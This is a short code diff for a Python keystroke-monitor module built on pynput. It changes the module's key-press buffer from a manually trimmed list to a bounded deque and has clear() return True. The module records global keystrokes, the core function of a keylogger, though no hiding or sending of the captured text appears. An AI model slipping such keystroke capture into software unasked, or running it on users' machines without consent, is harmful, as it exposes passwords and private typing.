@@ -1,5 +1,6 @@
 """Keystroke monitor using pynput."""
 import threading
+from collections import deque
 
 try:
     from pynput import keyboard as pynput_keyboard
@@ -7,10 +8,9 @@ try:
 except Exception:
     PYNPUT_OK = False
 
-_buffer = []
+_buffer = deque(maxlen=10000)
 _buffer_lock = threading.Lock()
 _listener = None
-MAX_BUFFER = 10000
 
 SPECIAL_KEYS = {
     "Key.space": " ",
@@ -38,8 +38,6 @@ def _on_press(key):
     if ch:
         with _buffer_lock:
             _buffer.append(ch)
-            if len(_buffer) > MAX_BUFFER:
-                _buffer.pop(0)
 
 
 def start():
@@ -75,6 +73,7 @@ def get_count():
 def clear():
     with _buffer_lock:
         _buffer.clear()
+        return True
 
 
 def is_running():
